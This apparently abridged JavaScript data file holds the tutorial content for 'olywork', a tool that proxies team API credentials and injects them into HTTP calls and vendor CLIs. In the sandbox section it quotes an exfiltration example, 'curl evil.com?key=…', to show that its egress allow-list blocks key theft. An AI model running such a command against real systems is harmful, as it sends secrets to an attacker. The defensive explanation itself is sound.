 ...
 * (src/olywork/web/index.html) and the standalone page (docs/tutorial.html) render
 * from `window.OLYWORK_TUTORIAL` and highlight with `window.olyworkHL`, so they never drift.
 *
...
(function () {
  ...
  const CONCEPTS = [
    ...
    { h: "Tool &amp; skill",
      p: "A <b>tool</b> = an upstream <code>base_url</code> + a list of credential <b>bindings</b> (a request may carry several). A <b>skill / bundle</b> = a recipe (SKILL.md) + its secrets + its tool(s), registered from a folder via <code>olywork.json</code>." },
    { h: "Import",
      p: "<code>olywork upload</code> is the bulk on-ramp: it scans a <code>.env</code> (matching ~80 providers) and/or a folder of skills, and registers everything you pick in one pass - building a <code>olywork.json</code> for any skill that lacks one. Preview first with <code>olywork scan</code> (read-only); idempotent, so re-run freely. <code>olywork skill install</code> is the reverse: pull a shared skill onto your machine." },
    { h: "Two ways to use a tool",
      p: "<code>olywork call</code> proxies an HTTP <b>API</b> - the secret is injected server-side and nothing lands on your machine. <code>olywork run</code> runs a vendor <b>command-line tool</b> (stripe, gh, gcloud…) with the credential injected, so you use the CLI without owning it or logging in. Two tiers: <code>--local</code> (default; runs on your machine - on Linux the key is isolated under a dedicated <code>olywork-run</code> user) and <code>--server</code> (runs on the registry server, so the key never reaches you). The owner opts each tool in first; <code>olywork runs</code> is the audit log." },
  ];
  ...
  const STEPS = [
    ...
    { part: "Setup", who: "sys", title: "Simulate three people on one machine",
      explain: "We play three users on one laptop by giving each its own <code>HOME</code>, so each gets an isolated <code>~/.olywork/config.json</code> pointed at the registry. In real life every person is on their own machine and drops the <code>HOME=</code> prefix.",
      ...
      notice: "Prefix any command with <code>HOME=~/.olywork-personas/&lt;name&gt;</code> to act as that person." },
    ...
    { part: "Part 1 · The catalog (no key, no setup)", who: "tom", title: "Find a tool by what it DOES",
      ...
      cmd: `olywork catalog search "backlinks for a domain"`,
      ...
      notice: "Several providers usually serve one capability at different prices. olywork shows them side by side — <b>choosing is yours</b>; it does not silently pick or fail over for you." },
    ...
    { part: "Part 1 · The catalog (no key, no setup)", who: "tom", title: "Read the price before you spend",
      ...
      cmd: `olywork catalog get tikhub.tiktok.user.profile`,
      ...
      notice: "An endpoint olywork has no published price for is <b>refused</b>, never served for free — you are told to connect your own key instead." },

    { part: "Part 1 · The catalog (no key, no setup)", who: "tom", title: "Call it — with no key anywhere",
      explain: "No account with TikHub, no signup, no key on the machine. olywork holds the credential, injects it server-side, and bills the call to the team's prepaid balance. Every new team starts with <b>$1.00 free</b>, which is hundreds of calls at this price.",
      cmd: `olywork call tikhub.tiktok.user.profile --query uniqueId=tiktok`,
    ...
    { part: "Part 1 · The catalog (no key, no setup)", who: "tom", title: "See exactly what it cost",
      ...
      notice: "Only calls on olywork's key cost balance. Your own keys, your own tools and vendor CLIs are all free of it." },

    // ---- Part 2 - Tom founds Olywork ---------------------------------
    { part: "Part 2 · Tom founds Olywork", who: "tom", title: "Tom signs in (the email door)",
      ...
      cmd: `HOME=~/.olywork-personas/tom olywork login --email tom@olywork.com`,
      out: `We sent a 6-digit code to tom@olywork.com.\nEnter code: 429641\n✓ Logged in as tom@olywork.com. Active org: tom-olywork-dev`,
      notice: "Check your inbox for the 6-digit code, then enter it. Tom now holds an <b>identity token</b> that works across every org he joins. <span class=\"muted\">(A dev box can set <code>OLYWORK_EMAIL_DEV_MODE=true</code> to print the code inline instead.)</span>" },

    { part: "Part 2 · Tom founds Olywork", who: "tom", title: "Tom creates the team",
      ...
      cmd: `HOME=~/.olywork-personas/tom olywork org create "Olywork"`,
    ...
    { part: "Part 3 · Bob joins (email door)", who: "tom", title: "Tom invites Bob",
      ...
      cmd: `HOME=~/.olywork-personas/tom olywork org invite bob@olywork.com --role member`,
    ...
    { part: "Part 3 · Bob joins (email door)", who: "bob", title: "Bob signs in as himself",
      ...
      cmd: `HOME=~/.olywork-personas/bob olywork login --email bob@olywork.com`,
      out: `We sent a 6-digit code to bob@olywork.com.\nEnter code: 512740\n✓ Logged in as bob@olywork.com. Active org: bob-olywork-dev`,
    ...
    { part: "Part 3 · Bob joins (email door)", who: "bob", title: "Bob sees his invite - no code",
      ...
      cmd: `HOME=~/.olywork-personas/bob olywork invites`,
    ...
    { part: "Part 3 · Bob joins (email door)", who: "bob", title: "Bob accepts",
      explain: "Bob joins Olywork by naming the org. No code - his proven identity is the proof. His active org switches to Olywork.",
      cmd: `HOME=~/.olywork-personas/bob olywork accept olywork`,
      out: `{\n  "org": "olywork",\n  "org_id": 2,\n  "name": "Olywork",\n  "role": "member"\n}`,
      notice: "Bob is now a <b>member</b> of Olywork." },

    { part: "Part 3 · Bob joins (email door)", who: "bob", title: "Bob's two hats",
      explain: "One identity, two memberships - owner of his personal org, member of Olywork. The same identity token works in both.",
      cmd: `HOME=~/.olywork-personas/bob olywork org ls`,
      out: `  bob-olywork-dev    bob@olywork.com    owner\n* olywork            Olywork            member   (active)`,
      notice: "The <code>*</code> marks the active org. Switch anytime with <code>olywork org use &lt;slug&gt;</code>." },
    ...
    { part: "Part 4 · Alice joins (code door)", who: "tom", title: "Tom invites Alice as a viewer",
      ...
      cmd: `HOME=~/.olywork-personas/tom olywork org invite alice@olywork.com --role viewer`,
    ...
    { part: "Part 4 · Alice joins (code door)", who: "alice", title: "Alice joins by code (no login first)",
      explain: "The contrast with Bob: Alice <b>never runs</b> <code>login</code>. The code itself proves her email, so <code>join</code> creates her, adds her to Olywork, and saves her token - all in one command.",
      cmd: `HOME=~/.olywork-personas/alice olywork org join ZTeW5ss-cXiyvzeMs3em-… --email alice@olywork.com`,
    ...
    { part: "Part 4 · Alice joins (code door)", who: "alice", title: "The viewer role has teeth",
      ...
      cmd: `HOME=~/.olywork-personas/alice olywork secret add testkey --value "nope"`,
    ...
    { part: "Part 5 · A tool through the proxy", who: "bob", title: "Bob registers a secret",
      ...
      cmd: `HOME=~/.olywork-personas/bob olywork secret add echo-key --value "sk-demo-secret-123"`,
      out: `{\n  "id": 1,\n  "name": "echo-key",\n  "kind": "env",\n  "owner": "bob@olywork.com",\n  "bundle_id": null\n}`,
      notice: "The secret is org-scoped (lives in Olywork) and owned by Bob. A tool binds to it by <code>id</code>." },
    ...
    { part: "Part 5 · A tool through the proxy", who: "bob", title: "Bob registers a tool",
      ...
      cmd: `HOME=~/.olywork-personas/bob olywork tool add echo --base-url https://postman-echo.com --secret 1`,
      ...
      notice: "For multi-credential upstreams, add more bindings with <code>--bind</code> - olywork applies every binding on each call." },

    { part: "Part 5 · A tool through the proxy", who: "alice", title: "Alice calls it - with no key",
      explain: "The whole point of olywork. Alice is a <b>viewer</b> with <b>no secret</b> on her machine. Yet when she calls, the upstream sees Bob's key, injected server-side.",
      cmd: `HOME=~/.olywork-personas/alice olywork call echo /get`,
    ...
    { part: "Part 5 · A tool through the proxy", who: "tom", title: "Every call is on the record",
      ...
      cmd: `HOME=~/.olywork-personas/tom olywork calls --limit 5`,
    ...
    { part: "Part 6 · Call shapes & skills", who: "alice", title: "Call by full URL (agent-native)",
      explain: "An agent often already knows the real upstream URL. Instead of <code>call &lt;tool&gt; &lt;path&gt;</code>, hand olywork the <b>whole URL</b> - it matches the host to a registered tool and injects the key. No olywork-specific knowledge needed.",
      cmd: `HOME=~/.olywork-personas/alice olywork call https://postman-echo.com/get`,
      ...
      notice: "olywork resolves the tool by <b>host</b>, so the agent-native full-URL form just works." },

    { part: "Part 6 · Call shapes & skills", who: "alice", title: "The raw HTTP underneath",
      explain: "<code>olywork call</code> is sugar. Under the hood it's a plain HTTP request to <code>&lt;proxy&gt;/call/&lt;upstream-url&gt;</code> with your token header - any language, any agent, <code>curl</code>.",
      cmd: `ATOK=$(python3 -c "import json;print(json.load(open('/Users/you/.olywork-personas/alice/.olywork/config.json'))['token'])")\ncurl -s -H "X-Olywork-Token: $ATOK" \\\n  "https://olywork.com/call/https://postman-echo.com/get"`,
      out: `# the postman-echo JSON again, "authorization": "Bearer sk-demo-secret-123" injected -\n# just curl, no secret on the client.`,
      notice: "The whole product in one line: prefix any upstream URL with the proxy, send your token, olywork swaps in the real credential." },

    { part: "Part 6 · Call shapes & skills", who: "bob", title: "Draft a skill's registration",
      explain: "A whole skill folder (a recipe + credential files) can register in one shot via a <code>olywork.json</code> contract. <code>skill init</code> scans <code>SKILL.md</code> + the <code>.secret/</code> dir and drafts it - guessing the base URL and finding the secret. No values go in the file, only references.",
      cmd: `HOME=~/.olywork-personas/bob olywork skill init --dir /tmp/skills/echo-svc`,
      out: `wrote /tmp/skills/echo-svc/olywork.json\n  auto: base_url=https://postman-echo.com | secrets=['echo-svc']\n  review / fill:\n    - base_url - heuristic guess, verify\n    - health / examples - optional`,
    ...
    { part: "Part 6 · Call shapes & skills", who: "bob", title: "Upload the whole skill",
      ...
      cmd: `HOME=~/.olywork-personas/bob olywork skill add --dir /tmp/skills/echo-svc`,
    ...
    { part: "Part 6b · Import - the magic bulk on-ramp", who: "bob", title: "Turn your whole .env into tools",
      explain: "The steps above, but for your <i>entire</i> environment at once. <code>olywork upload env</code> reads your <code>.env</code>, matches each variable against a catalog of ~80 providers (OpenAI, Stripe, Resend, Render…), and registers the ones you pick as ready-to-call tools. It reads <b>names only</b> to detect - the value is loaded just for the keys you confirm. Config vars (<code>*_HOST</code>, <code>*_MODEL</code>) and your app's own secrets (<code>SECRET_KEY</code>, <code>DATABASE_URL</code>) are excluded automatically.",
      cmd: `HOME=~/.olywork-personas/bob olywork upload env --select openai,stripe,resend`,
    ...
    { part: "Part 6b · Import - the magic bulk on-ramp", who: "bob", title: "Import a whole folder of skills",
      explain: "Point <code>olywork upload skills</code> at a directory of skills. For each, it uses an existing <code>olywork.json</code>, or <b>builds one</b> from the skill's script (base URL + which env var it reads) - registering API skills as tools and knowledge skills as recipe-only bundles, so the <i>whole team library</i> lands in the registry in one pass. Re-run any time; it skips what's already there (or <code>--replace</code> to update).",
      cmd: `HOME=~/.olywork-personas/bob olywork upload skills --dir ~/.claude/skills --all`,
    ...
    { part: "Part 6c · Run a CLI tool", who: "bob", title: "Run the vendor CLI - no login, nothing on disk",
      explain: "Now Bob runs Stripe's real CLI <i>through</i> olywork. Everything after <code>--</code> is handed to the vendor tool verbatim. olywork injects the credential just for this run; Bob never logged into Stripe or stored its key. The default tier is <code>--local</code> - it runs on Bob's own machine, and on Linux the key is isolated under a dedicated <code>olywork-run</code> user (installed once with <code>sudo olywork setup-local-run</code>; on macOS it's best-effort). Add <code>--server</code> to run it on the registry instead, for a catalog-known CLI, so the key never reaches Bob's machine at all.",
      cmd: `HOME=~/.olywork-personas/bob olywork run stripe -- get /v1/balance`,
      out: `{\n  "object": "balance",\n  "available": [{ "amount": 0, "currency": "usd" }],\n  …\n}\n# Stripe's own CLI ran with the org key injected - Bob never logged in or held the key.`,
      notice: "<code>olywork run &lt;tool&gt; -- &lt;args&gt;</code> for a CLI; <code>olywork call &lt;tool&gt; &lt;path&gt;</code> for an HTTP API - same credential, two ways to use it." },

    { part: "Part 6c · Run a CLI tool", who: "tom", title: "Every run is on the record",
      explain: "Like proxied calls, CLI runs are audited. A <code>--server</code> run is recorded in the run ledger with its exit code and duration; a <code>--local</code> run leaves its audit trail beside the calls (<code>olywork calls</code>). The owner reviews server runs with <code>olywork runs</code>.",
      cmd: `HOME=~/.olywork-personas/tom olywork runs --limit 5`,
      out: `[\n  {\n    "id": 1,\n    "user_email": "bob@olywork.com",\n    "bundle_name": "stripe",\n    "argv": ["get", "/v1/balance"],\n    "exit_code": 0,\n    "duration_ms": 812,\n    "created_at": "2026-07-02T…"\n  }\n]`,
      notice: "The mnemonic: <code>olywork call</code> → <code>olywork calls</code>; <code>olywork run</code> → <code>olywork runs</code>. Two verbs, two ledgers." },
    ...
    { part: "Part 7 · Org administration", who: "tom", title: "See the team",
      ...
      cmd: `HOME=~/.olywork-personas/tom olywork org members`,
    ...
    { part: "Part 7 · Org administration", who: "tom", title: "Promote Bob to admin",
      ...
      cmd: `HOME=~/.olywork-personas/tom olywork org set-role 2 admin`,
      out: `{\n  "user_id": 2,\n  "role": "admin",\n  "org_id": 2\n}`,
    ...
    { part: "Part 7 · Org administration", who: "bob", title: "Admin rights in action",
      ...
      cmd: `HOME=~/.olywork-personas/bob olywork org invite dana@olywork.com --role member`,
    ...
    { part: "Part 7 · Org administration", who: "bob", title: "Review pending invites",
      ...
      cmd: `HOME=~/.olywork-personas/bob olywork org invites`,
    ...
    { part: "Part 7 · Org administration", who: "bob", title: "Revoke an invite",
      ...
      cmd: `HOME=~/.olywork-personas/bob olywork org revoke 3`,
      out: `{\n  "revoked_invite": 3\n}`,
    ...
    { part: "Part 7 · Org administration", who: "alice", title: "The role gate, from the viewer side",
      ...
      cmd: `HOME=~/.olywork-personas/alice olywork org invite eve@olywork.com --role member`,
    ...
    { part: "Part 8 · Super-admin", who: "ops", title: "Become the platform operator",
      explain: "Super-admin sits <i>above</i> orgs - it reads and manages every tenant. Two ways to authorise: the platform bearer <code>OLYWORK_ADMIN_TOKEN</code>, or a user flagged <code>is_superadmin</code>. We use the bearer, read from <code>.env</code> so it never appears on screen.",
      cmd: `olywork admin login --token "$(grep -E '^OLYWORK_ADMIN_TOKEN=' .env | cut -d= -f2-)"`,
    ...
    { part: "Part 8 · Super-admin", who: "ops", title: "Every org, across all tenants",
      explain: "Cross-tenant visibility: Olywork with its members + tools, plus everyone's personal orgs.",
      cmd: `olywork admin orgs`,
    ...
    { part: "Part 10 · Cleanup", who: "bob", title: "Delete the tool",
      ...
      cmd: `HOME=~/.olywork-personas/bob olywork tool rm 1`,
      out: `{\n  "deleted": 1\n}`,
    ...
    { part: "Part 10 · Cleanup", who: "tom", title: "Delete the org (full cascade)",
      ...
      cmd: `HOME=~/.olywork-personas/tom olywork org delete olywork`,
      out: `{\n  "deleted_org": 2\n}`,
    ...
    { part: "Further tutorials", who: "sys", title: "Two deep-dive tutorials",
      ...
      cmd: `open https://olywork.com/tutorial-import-shell.md   # import + shell + the security sandbox\nopen https://olywork.com/tutorial-access.md         # per-member tool access control`,
      out: `# import-shell : olywork upload clis (your machine's CLIs -> team tools) + olywork shell (stripe/gh just work)\n#                + the local-run sandbox (isolated user, egress allow-list, filesystem jail)\n# access       : choose which tools each member may use + the local-run on/off toggle`,
  ...
  // Prose twin: src/olywork/web/tutorial-import-shell.md (served at /tutorial-import-shell.md).
  const IMPORT_SHELL = [
    { part: "Part 1 · Auto-import", who: "you", title: "Preview what would be registered",
      explain: "You already have <code>gh</code>, <code>stripe</code>, <code>gcloud</code> … installed and logged in. <code>olywork scan clis</code> reads your machine: for each CLI in olywork's catalog it checks whether the program is installed, whether its API key is in your environment, and whether you are logged into the CLI itself. It writes <b>nothing</b> - it only reports.",
      cmd: `olywork scan clis`,
      out: `Scanned 21 catalog CLIs — 9 installed here.\n\nWould register (server, key injected):\n  openai\n  stripe\nWould register (local, uses your login):\n  doctl\n  flyctl\n  gcloud\n  gh\n  supabase\n  vercel\nNot supported:\n  az: az has no token-override env var (device/browser login only)\n\n12 more catalog CLIs aren't installed. List them with: olywork scan clis --status`,
      notice: "Two tiers. <b>Server</b> (openai, stripe): the key is in your environment, so olywork can hold it and inject it - the key never touches a member's machine. <b>Local</b> (gh, gcloud, …): you're logged into the CLI itself, so olywork registers it with no secret and just runs the CLI you already authenticated." },
    ...
    { part: "Part 1 · Auto-import", who: "you", title: "Register them",
      ...
      cmd: `olywork upload clis --replace`,
    ...
    { part: "Part 1 · Auto-import", who: "you", title: "Confirm a local-tier CLI runs",
      explain: "A local-tier tool needs no credential at all - olywork runs the program you're already logged into, and records the run.",
      cmd: `olywork run gh -- --version`,
      out: `▸ gh · audit #58\ngh version 2.72.0 (2025-04-30)\nhttps://github.com/cli/cli/releases/tag/v2.72.0`,
      notice: "The <code>▸ gh · audit #58</code> line (on standard error) shows olywork wrapped and recorded the run; the rest is gh's own output." },
    ...
    { part: "Part 1 · Auto-import", who: "you", title: "See what's missing; add an off-catalog CLI",
      ...
      cmd: `olywork scan clis --status\nolywork upload clis --add mycli --env MYCLI_TOKEN --base-url https://api.mycli.com`,
    ...
    { part: "Part 2 · Shell mode", who: "you", title: "Start the shell",
      explain: "Typing <code>olywork run</code> before every command is friction. <code>olywork shell start</code> opens a subshell where every <b>registered</b> CLI runs with the team credential injected automatically - you just type <code>stripe</code>, <code>gh</code>, <code>gcloud</code> as normal.",
      cmd: `olywork shell start`,
      out: `▚ olywork shell — you're now in a shell where your team's CLIs just work.\n  The tools below run with the team credential injected for you — no \`olywork run\`,\n  no keys on this machine, and every call is audited.\n\n  Injected here (8):  doctl  flyctl  gcloud  gh  openai  stripe  supabase  vercel\n\n  Leave any time with exit (or Ctrl-D) — your normal shell returns unchanged.\n\n(olywork) $`,
      notice: "A private folder goes first on your <code>PATH</code> with one small wrapper (\"shim\") per registered CLI. The credential is <b>not</b> in this shell's environment - it is fetched per command, and exists only inside the one subprocess olywork spawns." },

    { part: "Part 2 · Shell mode", who: "you", title: "Use a team CLI - no `olywork run`",
      explain: "At the <code>(olywork)</code> prompt, run a registered CLI by its normal name. The shell finds olywork's shim first on <code>PATH</code> and routes the command through olywork.",
      cmd: `gh --version`,
      out: `▸ gh · audit #59\ngh version 2.72.0 (2025-04-30)\nhttps://github.com/cli/cli/releases/tag/v2.72.0`,
      notice: "You typed <code>gh</code>, not <code>olywork run gh</code> - and still got the audit line. Everything after the program name goes to the CLI verbatim, and its exit code is yours." },
    ...
    { part: "Part 2 · Shell mode", who: "you", title: "Route one CLI to the server; set a time limit",
      ...
      cmd: `olywork shell start --server-for stripe --ttl 60\n# inside the shell:\nstripe --version      # runs on the server; output streamed back\nexit\nolywork runs --limit 1`,
    ...
    { part: "Part 3 · The security sandbox", who: "sys", title: "Set it up (once, as admin)",
      explain: "A local run puts a shared team key on a member's machine for the length of one command. That is only safe if the member cannot capture the key. <code>sudo olywork setup-local-run</code> (Linux and macOS) builds a sandbox with three layers.",
      cmd: `sudo olywork setup-local-run`,
      out: `created hidden system user 'olywork-run' (uid 380)\ninstalled runner at /usr/local/bin/olywork-runner\ninstalled sudoers rule for member 'you'\n  egress: pf allow-list active — olywork-run may reach 95 host(s), all else dropped\n\ndone — you can now run:  olywork run <tool> -- <args>   (the CLI runs as olywork-run)`,
      notice: "It creates a dedicated no-login user <code>olywork-run</code>, a narrow rule that lets you run <b>only</b> the olywork runner as that user, and a network allow-list. From now on a local run executes as <code>olywork-run</code>, not as you." },

    { part: "Part 3 · The security sandbox", who: "you", title: "Layer 1 - isolation (you can't read the key)",
      explain: "The CLI runs as <code>olywork-run</code>, a different user id - a different user's process environment and memory are unreadable by you. To see it directly, run a tiny tool whose program is <code>id</code>.",
      cmd: `olywork run idtool`,
      out: `▸ idtool · audit #52\nuid=380(olywork-run) gid=380(olywork-run) groups=380(olywork-run)…`,
      notice: "The command ran as <b>uid=380(olywork-run)</b>, not as you. One requirement: olywork itself must be installed at a system path (e.g. <code>/usr/local/bin</code>) - olywork-run, by design, cannot read into your private home directory." },

    { part: "Part 3 · The security sandbox", who: "you", title: "Layer 2 - egress allow-list",
      explain: "Even isolated, a CLI feature that runs code could try to send the key to another site. The sandbox restricts <code>olywork-run</code>'s outbound network to the registry plus the tool API hosts in the catalog.",
      cmd: `sudo -u olywork-run curl -s -o /dev/null -w "%{http_code}\\n" https://api.github.com/zen   # a catalog host\nsudo -u olywork-run curl -s -o /dev/null -w "%{http_code}\\n" https://example.com          # anything else`,
      out: `200\n000`,
      notice: "<code>olywork-run</code> reached <code>api.github.com</code> (200) but was blocked from <code>example.com</code> (000) - so a rogue plugin's <code>curl evil.com?key=…</code> delivers nothing. API IPs drift: refresh with <code>sudo olywork setup-local-run --refresh-egress</code>." },

    { part: "Part 3 · The security sandbox", who: "you", title: "Layer 3 - filesystem jail",
      explain: "The last escape route is writing the key to a file you then read. The opt-in <code>--fs-jail</code> confines a run's writes to a private scratch folder only <code>olywork-run</code> can read, removed after the run.",
      cmd: `olywork run --fs-jail writetool -- /tmp/leak     # writetool's program is \`touch\`\nls /tmp/leak`,
  ...
  // Prose twin: src/olywork/web/tutorial-access.md (served at /tutorial-access.md).
  const ACCESS = [
    { part: "Setup", who: "sys", title: "Two dials, two people",
      ...
      out: `# each persona now points at the registry`,
      notice: "Prefix a command with <code>HOME=~/.olywork-personas/&lt;name&gt;</code> to act as that person. In real life each person is on their own machine and drops the prefix." },
    ...
    { part: "Part 1 · Invite with tailored access", who: "tom", title: "Invite Sam - one tool, no local runs",
      ...
      cmd: `HOME=~/.olywork-personas/tom olywork org invite sam@olywork.com --tools gh --local-run off`,
      out: `{\n  "code": "<one-time-invite-code>",\n  "email": "sam@olywork.com",\n  "role": "member",\n  "org_id": 44,\n  "expires_at": "2026-07-21T…"\n}`,
    ...
    { part: "Part 1 · Invite with tailored access", who: "tom", title: "(Alternative) let olywork ask",
      explain: "Run the invite <b>without</b> the access flags and olywork asks interactively - \"give access to all tools?\" - and, on no, shows a checklist of every tool (all pre-ticked) to uncheck the ones to withhold.",
      cmd: `HOME=~/.olywork-personas/tom olywork org invite sam@olywork.com`,
    ...
    { part: "Part 1 · Invite with tailored access", who: "sam", title: "Sam accepts",
      ...
      cmd: `HOME=~/.olywork-personas/sam olywork login --email sam@olywork.com\nHOME=~/.olywork-personas/sam olywork accept olywork`,
      out: `{\n  "org": "olywork",\n  "org_id": 44,\n  "name": "Olywork",\n  "role": "member"\n}`,
    ...
    { part: "Part 2 · The walls", who: "sam", title: "An allowed tool works",
      ...
      cmd: `HOME=~/.olywork-personas/sam olywork call gh zen`,
    ...
    { part: "Part 2 · The walls", who: "sam", title: "A withheld tool is blocked",
      ...
      cmd: `HOME=~/.olywork-personas/sam olywork call stripe v1/balance`,
      out: `{\n  "detail": "you don't have access to the tool 'stripe' in this team — an admin can grant it (dashboard → Team, or \`olywork org access <you> --tools …\`)"\n}`,
      notice: "The message tells Sam exactly how to get access. <code>olywork run stripe</code> and <code>olywork run --server stripe</code> are refused the same way - no side path." },

    { part: "Part 2 · The walls", who: "sam", title: "Local execution is off",
      explain: "<code>gh</code> is allowed, but Sam's <code>local_run_enabled</code> is <b>off</b>, so he cannot run it on his own machine. olywork points him at the server tier instead.",
      cmd: `HOME=~/.olywork-personas/sam olywork run gh -- --version`,
      out: `olywork: local execution is disabled for you — run on the server instead (\`olywork run --server\`), or ask an admin to enable local runs for your account`,
      notice: "This is the <i>local</i> wall, separate from tool access - <code>olywork run --server gh …</code> (the key stays on the registry) is allowed." },
    ...
    { part: "Part 2 · The walls", who: "sam", title: "A member can't manage the team",
      ...
      cmd: `HOME=~/.olywork-personas/sam olywork org members`,
      out: `{\n  "detail": "admin role in this org is required"\n}`,
    ...
    { part: "Part 3 · Adjust later", who: "tom", title: "Widen Sam's access",
      ...
      cmd: `HOME=~/.olywork-personas/tom olywork org access 63 --all-tools --local-run on`,
      out: `{\n  "user_id": 63,\n  "org_id": 44,\n  "tool_access": null,\n  "local_run_enabled": true\n}`,
    ...
    { part: "Part 3 · Adjust later", who: "sam", title: "Sam tries again - everything works",
      ...
      cmd: `HOME=~/.olywork-personas/sam olywork call stripe v1/balance\nHOME=~/.olywork-personas/sam olywork run gh -- --version`,
      out: `{ "object": "balance", "available": [ … ] }\n▸ gh · audit #58\ngh version 2.72.0 (2025-04-30)`,
      notice: "The same two dials, opened up. Tom can pin Sam to an exact set again any time: <code>olywork org access 63 --tools gh,gcloud</code>. An unknown tool name is rejected with a clear 422 - you never grant a typo." },
  ...
  function olyworkLang(text, kind) { return kind === "cmd" ? "shell" : (/^\s*[[{]/.test(text) ? "json" : "text"); }

  const AUTH = [
    { h: "env - a static key or token",
      p: `The common case: an API key or bearer token. olywork injects it via the binding's <b>format</b> - e.g. <code>Authorization: Bearer {secret}</code> in a header, or <code>?api_key={secret}</code> in the query string. Set it with <span class="mono">olywork secret add stripe-key --value sk-…</span>, then bind it on a tool.` },
    { h: "oauth - auto-refreshed tokens",
      p: `For OAuth APIs (Google, GitHub…). Store the token blob (access + refresh + client id/secret); olywork <b>auto-refreshes</b> the access token ~60s before it expires - single-flight, so a burst of calls triggers exactly one refresh - so your calls never hit a 401. Mint the first token via the hosted browser-consent flow: <span class="mono">olywork oauth connect &lt;name&gt; --client-secret … --scopes …</span>. The refresh_token comes back and the credential lands in auto-refresh mode.` },
    { h: "secret_file - a JSON credential",
      p: `When the credential is a JSON file (a service-account, an authorized-user file…). olywork pulls one field out of the blob (<span class="mono">secret_field</span>, default <code>access_token</code>) and injects it. Set it with <span class="mono">olywork secret add gcp --file cred.json --kind secret_file</span>.` },
  ...
  const SKILLS = [
    ...
    { h: "Register it",
      p: `<span class="mono">olywork skill init --dir ./my-skill</span> scans <code>SKILL.md</code> + <code>.secret/</code> and drafts <code>olywork.json</code> (guessing <code>base_url</code>, finding the secrets). Review it, then <span class="mono">olywork skill add --dir ./my-skill</span> uploads recipe + secrets + tool <b>atomically</b>.` },
    { h: "Make it better - practices",
      p: `• One tool per real upstream; add a <b>health_check</b> so olywork can validate the creds.<br>• Name secrets by purpose (<code>stripe-key</code>, not <code>key1</code>).<br>• Keep <span class="mono">.secret/</span> gitignored; commit <span class="mono">olywork.json</span> (it's reference-only).<br>• Write a real SKILL.md - it's what a teammate or agent reads to use the tool.<br>• Prefer <b>oauth</b> over long-lived keys where the API supports it (auto-refresh + revocable).` },
  ];
  window.OLYWORK_TUTORIAL = { personas: PERSONAS, concepts: CONCEPTS, roles: ROLES, auth: AUTH, skills: SKILLS, steps: STEPS,
                           importShell: IMPORT_SHELL, access: ACCESS };
  window.olyworkHL = olyworkHL;
  window.olyworkLang = olyworkLang;
})();
